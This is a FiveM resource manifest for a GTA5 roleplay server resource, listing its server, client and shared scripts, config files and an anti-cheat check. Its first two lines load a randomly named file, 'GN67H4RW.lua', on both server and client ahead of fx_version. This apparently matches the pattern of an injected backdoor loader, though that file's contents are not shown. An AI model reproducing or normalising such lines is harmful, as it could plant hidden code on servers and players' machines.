server_script "GN67H4RW.lua"
client_script "GN67H4RW.lua"
fx_version("cerulean")
game("gta5")
lua54("yes")

client_script("@sandbox-base/components/cl_error.lua")
client_script("@sandbox-pwnzor/client/check.lua")

server_scripts({
	"server/**/*.lua",
})

shared_scripts({
	"config/config.lua",
	"config/spawns.lua",
	"config/defaultJobs/*.lua",
})

client_scripts({
	"client/**/*.lua",
})
